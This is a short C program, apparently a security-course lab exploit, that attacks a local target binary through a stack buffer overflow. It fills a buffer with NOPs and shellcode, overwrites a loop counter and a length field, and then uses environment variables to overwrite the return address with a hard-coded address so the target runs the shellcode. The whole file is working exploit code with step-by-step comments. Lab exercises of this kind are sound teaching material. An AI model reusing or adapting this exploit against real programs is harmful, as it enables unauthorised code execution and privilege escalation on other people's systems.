#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[3];
	char  fill[12];
	char filler[226];
	int i;

	// start by filling the exploit with any filler (we used NOPs) to get
	//to the bottom of the target buffer
	for(i=0;i<218;i++){
	  filler[i]='\x90';
	}
	
	//overwrite least significant byte of i with 0b so that we can jump
	// the rest of the number without changing any other bytes 
	//(i just increases by 4)
	filler[219]='\x0b';
	filler[220]='\x90';
	filler[221]='\x90';
	filler[222]='\x90';
	
	//begin overwriting len to be 284 (011c) we will need to fill the rest of
	//the bytes of 0x0000011C using the environment variables as we need to include 
	//NULLS which won't be accepted using stringcat
	filler[223]='\x1c';
	filler[224]='\x01';

	// pad after len to get to return address
	for (i = 0; i < 8; i++){
	  fill[i]='\x90';
	}
	
	//overwrite return address with address of buf in foo
	fill[8]='\x40';
	fill[9]='\xfd';
	fill[10]='\x42';
	fill[11]='\x40';

	args[0] = TARGET;

	//arg 1 is shellcode at beginning of buffer + filler to get us down through
	//and replacing i, and the beginning of len
	args[1] = strcat(shellcode,filler);
	args[2] = NULL;

	//we already have 1 NULL in from args[1] i.e. have 00011C, need one more NUll to fill in full byte
	env[0] = "\x00";
	
	//set the environment variable to be fill, this will be read after the args in memory since we increased length
	//and will arrive at and overwrite the return address of foo.
	env[1] = fill;
	env[2] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
